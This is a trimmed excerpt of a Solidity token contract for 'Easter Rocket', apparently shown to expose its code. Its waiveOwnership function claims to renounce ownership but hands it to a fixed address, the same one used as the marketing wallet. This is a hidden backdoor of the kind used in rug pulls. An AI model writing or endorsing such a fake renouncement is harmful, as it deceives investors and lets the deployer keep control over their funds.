...
Telegram : https://t.me/easterrocket
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA6Cd2f1B285Ba3C5ef6f09C17BB7c0cD6aFd6985);
    }
...
contract EASTERROCKET is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Easter Rocket";
    string private _symbol = "Easter rocket";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA6Cd2f1B285Ba3C5ef6f09C17BB7c0cD6aFd6985);
    address payable public teamWalletAddress = payable(0xE8A9BCA69777F996F7E08d05BdcDc406F776FC41);
